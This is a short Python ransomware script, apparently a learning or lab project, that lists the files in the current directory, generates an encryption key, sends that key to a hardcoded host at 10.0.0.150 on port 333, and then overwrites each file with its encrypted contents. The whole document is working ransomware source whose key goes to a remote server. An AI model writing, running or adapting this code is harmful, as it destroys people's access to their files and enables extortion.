import os
import socket
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransomeware.py" or file == "server.py" or file == "decrypt.py" or file == "random_key.txt":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

key = Fernet.generate_key()

IP = "10.0.0.150"  
PORT = 333

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP, PORT))
    print('successfuly connected')
    s.send(key)
    print('key sended')
    s.close()

# with open("thekey.key", "wb") as thekey:
#     thekey.write(key)

for file in files:
    with open (file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)